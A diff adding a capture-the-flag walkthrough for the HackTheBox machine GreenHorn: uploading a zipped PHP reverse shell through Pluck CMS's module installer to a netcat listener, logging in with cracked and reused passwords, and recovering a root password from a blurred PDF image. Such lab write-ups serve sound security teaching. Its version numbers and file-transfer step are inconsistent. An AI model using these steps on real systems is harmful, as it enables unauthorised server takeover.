@@ -198,16 +198,51 @@ GENERATED WORDS: 4612
 + http://GreenHorn.htb/servlets-examples (CODE:200|SIZE:2)
 ```
 
-After some scanning i got this directory's & files 
+After discovering GreenHorn.htb's admin panel (/admin.php), version 4.7.16 was identified, which is vulnerable to file upload reverse shell exploitation. Further enumeration revealed a service running on port 3000. I started reading code after some time i got ( **GreenAdmin/GreenHorn -> Data -> Settings -> Pass.php** )
+
+In pass.php i got a hash cracked it with crackstation. 
+I found the website is running on pluck 4.7.18 and I searched exploitDB for vulnerabilities associated with this version and I found out that there is a remote code execution exploit which allow potential attacker to upload malicious file in zip format on the website.
+
+With that i had uploded a php revershell in zip format.
+```
+zip reverse_shell.zip reverse_shell.php
+```
+
+- In backgroung nc is running  **nc -lvnp 4444**  
+
+- Next, I navigated to the option section on the website and clicked on “manage modules” and clicked on “install a module”. This displayed a webpage where I can upload a file. So, I uploaded the reverse-shell.zip file I have on my machine andgot a reverse shell response
+- I changed the directory to home and list all the files/folders in it. Next, I tried to change the current user to junior by running the super user command: su junior and I was prompted to type a password, I used **iloveyou1** and I got the shell as.
+
+**junior@greenhorn:/home$**
+I changed the directory to the root folder to get the user.txt file and I run the following command to read the file:
+```
+cat user.txt
+```
+
+After the file has been successfully created, I will establish an http server on port 3333 to copy the file from the shell to my machine by running the following command:
+```
+python3 -m http.server 3333
+
+wget greenhorn.htb:3333/openvas.pdf
+```
+
+Next, I will open the pdf file to view the content. In the pdf, a section to the file was blurred and this contains a secret text might be password to get the root flag. To view the content of the blurred part, I will upload the file to https://www.adobe.com/in/acrobat/online/extract-pdf-pages.html, a website for extracting embedded images in pdf files.
 
 
+```
+sidefromsidetheothersidesidefromsidetheotherside
+```
+After extracting the image i got this text i directly tired to login in via root user - 
+```
+su root
+password: sidefromsidetheothersidesidefromsidetheotherside
+
+ls
+cleanup.sh  restart.sh  root.txt
+
+cat root.txt
+************
+```
 
 
-
-
-
-
-
-
-
-
+Tbh it's a easy Machine.
